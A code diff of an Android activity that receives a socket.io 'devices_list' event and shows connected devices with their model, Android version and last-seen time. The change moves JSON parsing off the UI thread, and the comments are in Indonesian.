@@ -11,6 +11,8 @@ import io.socket.client.Socket;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.net.URISyntaxException;
+import java.util.ArrayList;
+import java.util.List;
 
 public class MainActivity extends Activity {
     private Socket socket;
@@ -41,13 +43,27 @@ public class MainActivity extends Activity {
         });
 
         socket.on("devices_list", args -> {
+            // Parsing JSON di luar UI thread
             try {
                 JSONArray devices = (JSONArray) args[0];
+                List<String[]> deviceData = new ArrayList<>();
+                for (int i = 0; i < devices.length(); i++) {
+                    JSONObject dev = devices.getJSONObject(i);
+                    String id = dev.getString("id");
+                    String model = dev.getString("model");
+                    String android = dev.optString("android", "??");
+                    String last = dev.optString("last_seen", "unknown");
+                    deviceData.add(new String[]{id, model, android, last});
+                }
+                // Kirim data bersih ke UI thread
                 runOnUiThread(() -> {
                     deviceContainer.removeAllViews();
-                    for (int i = 0; i < devices.length(); i++) {
-                        JSONObject dev = devices.getJSONObject(i);
-                        // Buat item view yang bisa diklik
+                    for (String[] data : deviceData) {
+                        String deviceId = data[0];
+                        String model = data[1];
+                        String androidVer = data[2];
+                        String lastSeen = data[3];
+
                         LinearLayout item = new LinearLayout(MainActivity.this);
                         item.setOrientation(LinearLayout.VERTICAL);
                         item.setBackgroundColor(0xFF1a1a1a);
@@ -59,19 +75,18 @@ public class MainActivity extends Activity {
                         params.setMargins(0, 0, 0, 16);
                         item.setLayoutParams(params);
 
-                        String deviceId = dev.getString("id");
                         TextView idView = new TextView(MainActivity.this);
                         idView.setText("🆔 " + deviceId);
                         idView.setTextColor(0xFF00ff41);
                         idView.setTextSize(16);
 
                         TextView modelView = new TextView(MainActivity.this);
-                        modelView.setText("📱 " + dev.getString("model") + " | Android " + dev.optString("android", "??"));
+                        modelView.setText("📱 " + model + " | Android " + androidVer);
                         modelView.setTextColor(0xFFFFFFFF);
                         modelView.setTextSize(14);
 
                         TextView lastView = new TextView(MainActivity.this);
-                        lastView.setText("🕒 " + dev.optString("last_seen", "unknown"));
+                        lastView.setText("🕒 " + lastSeen);
                         lastView.setTextColor(0xFFAAAAAA);
                         lastView.setTextSize(12);
 
@@ -88,7 +103,7 @@ public class MainActivity extends Activity {
 
                         deviceContainer.addView(item);
                     }
-                    statusText.setText("🟢 ONLINE | " + devices.length() + " perangkat");
+                    statusText.setText("🟢 ONLINE | " + deviceData.size() + " perangkat");
                 });
             } catch (Exception e) {
                 runOnUiThread(() -> statusText.setText("⚠️ Error parsing data"));
